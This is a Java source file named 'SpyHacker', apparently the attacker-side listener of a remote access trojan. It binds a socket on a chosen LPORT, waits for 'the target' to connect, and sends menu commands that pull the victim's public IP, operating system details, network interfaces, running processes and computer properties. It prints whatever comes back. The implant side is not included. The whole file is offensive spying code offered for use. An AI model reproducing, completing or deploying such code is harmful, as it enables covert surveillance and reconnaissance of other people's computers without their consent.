/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
//package spyhacker;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

/**
 *
 * @author amine gasa
 */
public class SpyHacker {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        System.out.println("\t\tAuthor is GASBAOUI MOHAMMED EL AMINE ");
        Scanner x = new Scanner(System.in);

        Scanner x2 = new Scanner(System.in);
        System.out.print("Set LPORT : ");
        int port = x2.nextInt();
        ServerSocket ss = new ServerSocket(port);
        System.out.println("Waiting the target...");
        Socket s = ss.accept();

        DataInputStream dis = new DataInputStream(s.getInputStream());
        DataOutputStream dos = new DataOutputStream(s.getOutputStream());

        try {
            String msgin = "", msgout = "";
            while (!msgin.equals("6")) {
                System.out.println("__________________________________________");
                System.out.println("1 : get public ip target");
                System.out.println("2 : get info about operating system");
                System.out.println("3 : get info about all interfaces network");
                System.out.println("4 : get all list process");
                System.out.println("5 : Displays the  properties of the computer");
                System.out.println("6 : close the session");
                System.out.println("____________________________________________");
                System.out.print("Choose Number : ");
                msgout = x.nextLine();
                dos.writeUTF(msgout);
                dos.flush();

                msgin = dis.readUTF();
                System.out.println(msgin);

            }
            s.close();
            x.close();

        } catch (Exception e) {

        }
    }
}
